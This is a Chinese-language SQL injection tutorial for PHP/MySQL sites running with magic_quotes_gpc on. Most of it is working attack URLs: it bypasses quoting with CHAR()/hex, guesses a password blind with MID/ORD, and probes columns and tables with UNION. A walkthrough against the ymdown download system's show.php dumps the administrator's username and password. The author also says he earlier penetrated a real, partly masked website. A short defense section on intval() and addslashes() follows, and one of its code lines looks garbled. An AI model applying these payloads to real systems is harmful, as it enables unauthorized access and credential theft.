@@ -1,0 +1,303 @@
+
+magic_quotes_gpc为on【非单引号注入】
+
+注：现在我们假设magic_quotes_gpc为on了。 
+
+　　众所周知，整形的数据是不需要用引号引起来的，而字符串就要用引号，
+
+这样可以避免很多问题。但是如果仅仅用整形数据，我们是没有办法注入的，
+
+所以我需要把我们构造的语句转换成整形类型，这个就需要用到CHAR()，ASCII(),ORD(),CONV()这些函数了，举个简单的例子： 
+
+Select * FROM user Where username='angel' 
+
+如何使$username不带引号呢？很简单我们这样提交就可以了
+ 
+Select * FROM user Where username=char(97,110,103,101,108) 
+
+# char(97,110,103,101,108) 相当于angel，十进制。 
+
+Select * FROM user Where username=0x616E67656C 
+
+# 0x616E67656C 相当于angel，十六进制。 
+
+其他函数大家自己去测试好了，但是前提就如上面所说的，
+
+我们可以构造的变量不被引号所包含才有意义，不然我们不管构造什么，只是字符串，发挥不了作用，
+
+比如前面猜密码的例子(user,php)，我们把查询条件改为userid：
+ 
+Select * FROM user Where userid=userid 
+
+按照正常的，提交： 
+http://127.0.0.1/injection/user.php?userid=1 
+
+就可以查询userid为1的用户资料，因为1是数字，所以有没有引号都无所谓，但是如果我们
+ 
+构造： 
+http://127.0.0.1/injection/user.php?userid=1 and password=mypass 
+
+绝对错误，因为mypass是字符串，除非提交： 
+
+http://127.0.0.1/injection/user.php?userid=1 and password='mypass' 
+
+由于magic_quotes_gpc打开的关系，这个是绝对不可能的。引号会变成/’，
+
+我们有什么办法可以把这些字符串变成整形数据吗？
+
+就是用CHAR()函数，如果我们提交： 
+
+http://127.0.0.1/injection/user.php?userid=1 and password=char(109,121,112,97,115,115) 
+
+正常返回，实践证明，我们用CHAR()是可行的，我们就把CHAR()用进LEFT函数里面逐位猜解 
+
+http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)=char(109) 
+
+正常返回，说明userid为1的用户，password字段第一位是char(109)，我们继续猜：
+ 
+http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,2)=char(109,121) 
+
+又正常返回，说明正确，但这样影响到效率，既然是整形，我们完全可以用比较运算符来比较：
+ 
+http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)>char(100) 
+
+然后适当调整char()里面的数字来确定一个范围，很快就可以猜出来，到了后面的时候，还是可以用比较运算符来比较： 
+
+http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,3)>char(109,121,111) 
+
+而原来已经猜好的不用改变了，很快就可以猜完： 
+
+http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,6)=char(109,121,112,97,115,115) 
+
+然后在mysql>命令提示符下或者在phpMyadmin里面执行： 
+
+select char(109,121,112,97,115,115) 
+
+就会返回：mypass 
+
+当然也可以使用SUBSTRING(str,pos,len)和MID(str,pos,len)函数，
+
+从字符串 str 的 pos 位置起返回 len 个字符的子串。这个和ACCESS是一样的。还是刚才的例子，
+
+我们猜password字段 的第三位、第四位试试，第三位是p，第四位是a，我们这样构造：
+ 
+http://127.0.0.1/injection/user.php?userid=1 and mid(password,3,1)=char(112) 
+
+http://127.0.0.1/injection/user.php?userid=1 and mid(password,4,1)=char(97) 
+
+我们要的结果就迸出来了。当然，如果觉得麻烦，还可以用更简单的办法，就是利用ord()函数，具体作用可以去查看MYSQL参考手册，
+
+该函数返回的是整形类型的数据，可以用比较运算符进行比较、当然得出的结果也就快多了，也就是这样提交：
+ 
+http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))>111 
+
+http://127.0.0.1/injection/user.php?userid=1 and ord(mid(password,3,1))<122 
+
+这样我们就得出结果了，然后我们再用char()函数还原出来就好了。至于其他更多函数，大 
+ 
+3、快速确定未知数据结构的字段及类型 
+
+如果不清楚数据结构，很难用UNION联合查询，这里我告诉大家一个小技巧，也是非常有用非 常必要的技巧，充分发挥UNION的特性。 
+
+还是拿前面的show.php文件做例子，当我们看到形如xxx.php?id=xxx的URL的时候，如果要 UNION，就要知道这个xxx.php查询的数据表的结构
+
+我们可以这样提交来快速确定有多少个字段 
+ 
+http://127.0.0.1/injection/show.php?id=-1 union select 1,1,1 
+
+有多少个“1”就表示有多少个字段，可以慢慢试，如果字段数不相同，就肯定会出错，如果字段数猜对了，就肯定会返回正确的页面，字段数
+出来了，就开始判断数据类型，其实也很容易 
+
+随便用几个字母代替上面的1，但是由于magic_quotes_gpc打开，我们不能用引号，老办法，还 
+
+是用char()函数，char(97)表示字母“a”，如下：
+ 
+http://127.0.0.1/injection/show.php?id=-1 union select char(97),char(97),char(97) 
+
+如果是字符串，那就会正常显示“a”，如果不是字符串或文本，也就是说是整形或布尔形， 就会返回“0” 
+
+判断最主要靠什么？经验，我以前一直都说，经验很重要，丰富经验能更好的作出正确的判断，因为程序的代码是千变万化的，
+
+我们这里是只是举个最简单的例子，这里由于局限性，程序都是我自己写、自己测试的。方法因程序而异。
+
+希望大家在实战中，注意区别，不要照搬，灵活 运用才是根本。 
+
+4、猜数据表名 
+
+在快速确定未知数据结构的字段及类型的基础上，我们又可以进一步的分析整个数据结构，那就是猜表名，
+
+其实使用UNION联合查询的时候，不管后面的查询怎么“畸形”，只要没有语句上的问题，都会正确返回，也就是说，我
+
+们可以在上面的基础上，进一步猜到表名了，比如刚才我 们提交：
+ 
+http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 
+
+返回正常的内容，就说明这个文件查询的表内是存在3个字段的，然后我们在后面加入from  table_name，也就是这样： 
+
+http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from members 
+
+http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from admin 
+
+http://127.0.0.1/injection/show.php?id=1 union select 1,1,1 from user 
+
+如果这个表是存在的，那么同样会返回应该显示的内容，如果表不存在，当然就会出错了，所以我的思路是先获得有漏洞的文件所查询表的数
+据结构，确定结果后再进一步查询表，这个手工操作是没有效率的问题的，不到一分钟就可以查询到了，
+
+比如我们在测试www.***bai.net就是这样，后面的实例会涉及到。但是有一个问题，由于很多情况下，很多程序的数据表都会有一个前缀，
+
+有这个前缀就可以让多个程序共用一个数据库。比如： 
+
+site_article 
+site_user 
+site_download 
+forum_user 
+forum_post 
+…… 
+
+如果安全意识高的话，管理员会加个表名前缀，那猜解就很麻烦了，不过完全可以做一个表名列表来跑。这里就不多说了，
+
+后面会有一个具体的例子来解开一切迷茫^_^…… 实例
+ 
+下面对一个国内非常出名的站点进行善意的攻击测试，来对上面的知识进行一次大概的验证 
+
+出于影响等诸多因素，我们称这个站点为HB(www.***bai.net)，HB使用的是夜猫的文章系统和 
+
+下载系统，不过文章系统已经升级了，我们就不看了，下载系统是绝对有问题的，不过由于我现 
+
+在写文章的电脑不上网，我用相同的下载系统在本地进行一次模拟的测试。实际上，我事前早用 
+
+更狠毒的技术渗透过HB。 
+
+首先我们找到有问题的文件，show.php?id=1，我们马上看看数据结构和表名，看看B有没有改字段和表名，我早知道夜猫下载系统1.0.1版的软
+件信息的表有19个字段，就提交：
+ 
+http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 
+
+注意，这里有19个“1”，返回正常的页面，我可以可以肯定字段没有变，我们也就别拖拉了 
+
+直接看看夜猫的默认用户数据表是否存在： 
+
+http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user 
+
+这个HB还真是够懒的，这么烂的程序也不知道先修改一下再用，不过也是，没有多少人和我一样有闲心先去加固程序才用的，再看默认的用户
+id还在不在？ 
+
+http://127.0.0.1/ymdown/show.php?id=1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 
+
+忘记了，就算不存在id为1的用户，前面的查询是真的，照样会正常返回数据库的软件信息， 
+
+我们只能让前面的查询为假，才能使后面查询的结果显示出来，但我们要注意一点，show.php文 
+
+件里面有这样一段代码： 
+
+if ($id > "0" && $id < "999999999" ): 
+
+//这里是正确执行的代码 
+
+else: 
+echo "<p><center><a href=./list.php>无记录</a></p>n"; 
+
+也就是说我们的ID的值再怎么离谱也不能在0和999999999之外，HB的软件肯定不会超过10000 个的，我们就提交：
+ 
+http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 
+
+正常返回了，表格里的数据全部是“1”，说明ID还在哦。如果不存在的话，页面只返回的数据全部是不详，因为程序的判断是如果数据为空就
+显示不详。现在确定了ID存在后，还要确定是不是管理员才行啊：
+ 
+http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and groupid=1 
+
+程序规定groupid为1是超级管理员，既然都返回正确信息了，我们就直接构造畸形语句，暴出我们需要的用户名和密码，嘿嘿，首先看看
+ymdown表的数据结构，因为show.php是查询它的，所以我们应该看它的数据结构。 
+
+Create TABLE ymdown ( 
+　id int(10) unsigned NOT NULL auto_increment, 
+　name varchar(100) NOT NULL, 
+　updatetime varchar(20) NOT NULL, 
+　size varchar(100) NOT NULL, 
+　empower varchar(100) NOT NULL, 
+　os varchar(100) NOT NULL, 
+　grade smallint(6) DEFAULT ’0’ NOT NULL, 
+　viewnum int(10) DEFAULT ’0’ NOT NULL, 
+　downnum int(10) DEFAULT ’0’ NOT NULL, 
+　homepage varchar(100), demo varchar(100), 
+　brief mediumtext, img varchar(100), 
+　sort2id smallint(6) DEFAULT ’0’ NOT NULL, 
+　down1 varchar(100) NOT NULL, 
+　down2 varchar(100), 
+　down3 varchar(100), 
+　down4 varchar(100), 
+　down5 varchar(100), 
+　PRIMARY KEY (id) 
+); 
+
+用户名和密码的数据类型都是varchar，所以我们要选择ymdown表里数据类型是varchar来，如果把varchar的数据写到int的地方当然是不可能显示的了，
+
+由于updatetime（更新日期）的长度是20，可能会出现显示不完全的情况，我们就把用户名显示在name（软件标题）那里，
+
+密码显示在size（文件大小）那里好了，在19个“1”中，name和size分别是第二个和第四个，我们提交 
+ 
+http://127.0.0.1/ymdown/show.php?id=10000 union select   
+1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 
+
+结果成功返回了我们所需要的用户名和密码 
+
+验证测试结果 
+
+渗透过程就结束了，不过由于黑白把入口给改了，无法登陆，但我们仅仅测试注入，目 
+
+的已经达到了，就没有必要进后台了，我后来又继续构造SQL语句来验证我们获取的密码是否正确 
+
+依次提交： 
+
+http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,1,1))=49
+ 
+#验证第一位密码 
+http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,2,1))=50 
+
+#验证第二位密码 
+http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,3,1))=51 
+#验证第三位密码 
+http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,4,1))=52
+
+用select char(49,50,51,52,53,54)就可以得到123456。 
+
+OK！测试结束，验证我们的结果没有错误。说明一下，密码本身是123456，可以不用ord()函数而直接猜，但为了大家能看到一个完整的过程，
+我还是“专业”一点好了 注入的防范 
+
+防范可以从两个方面着手，一个就是服务器，二个就是代码本身，介绍服务器配置的文章很多了，
+
+无非就是把magic_quotes_gpc设置为On，display_errors设置为Off，这里也就不在多说，既然本文接触都是程序的问题，
+
+我们还是从程序本身寻找原因 　如果说php比asp易用，安全，从内置的函数就可以体现出来。如果是整形的变量，
+
+只需使用一个intval()函数即可解决问题，在执行查询之前，我们先处理一下变量，如下面的例子就是很安全的了：
+ 
+$id = intval($id); 
+mysql_query("Select * FROM article Where articleid=’$id’"); 
+
+或者这样写： 
+mysql_query("Select * FROM article Where articleid=".intval($id)."") 
+
+管如何构造，最终还是会先转换为整形猜放入数据库的。很多大型程序都是这样写，非常简洁。 
+
+字符串形的变量也可以用addslashes()整个内置函数了，这个函数的作用和 
+
+magic_quotes_gpc一样，使用后，所有的 ’ (单引号), " (双引号), (反斜线) and 空字符会自 
+
+动转为含有反斜线的溢出字符。而且新版本的php，就算magic_quotes_gpc打开了，再使用 addslashes()函数，也不会有冲突，
+
+可以放心使用。例子如下： 
+$username = addslashes($username); 
+mysql_query("Select * FROM members Where userid=’$username’"); 
+
+或者这样写： 
+mysql_query("Select * FROM members Where userid=".addslashes($username)."") 
+
+使用addslashes()函数还可以避免引号配对错误的情况出现。而刚才的前面搜索引擎的修补 
+方法就是直接把“_”、“%”转换为“_”“%”就可以了，当然也不要忘记使用addslashes()函 
+数。具体代码如下： 
+$keywords = addslashes($keywords); 
+$keywords = str_replace("_","_",$keywords); 
+$keywords = str_replace("%","%",$keywords); 
+
+不用像ASP那样，过滤一点变量，就要写一大堆的代码，就是上面的一点点代码，我们就可以把本文所有的问题解决了，是不是很简便？
